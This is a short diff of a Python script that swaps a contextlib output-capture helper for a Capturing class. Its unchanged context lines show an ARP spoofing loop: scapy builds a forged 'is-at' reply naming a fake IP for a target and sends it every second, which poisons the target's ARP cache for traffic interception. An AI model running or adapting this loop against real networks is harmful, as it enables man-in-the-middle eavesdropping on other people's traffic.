@@ -95,23 +95,7 @@ import sys
 import time
 from scapy.all import sniff, sendp, ARP, Ether
 from cStringIO import StringIO
-import contextlib
-@contextlib.contextmanager
-def capture():
-    import sys
-    from cStringIO import StringIO
-    oldout,olderr = sys.stdout, sys.stderr
-    try:
-        out=[StringIO(), StringIO()]
-        sys.stdout,sys.stderr = out
-        yield out
-    finally:
-        sys.stdout,sys.stderr = oldout, olderr
-        out[0] = out[0].getvalue()
-        out[1] = out[1].getvalue()
 
-# with capture() as out:
-    # print 'hi'
 class Capturing(list):
     def __enter__(self):
         self._stdout = sys.stdout
@@ -134,7 +118,7 @@ arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
 packet = ethernet / arp
 
 while True:
-    with capture() as out:
+    with Capturing() as output:
       sendp(packet, iface=iface)
     time.sleep(1)
 
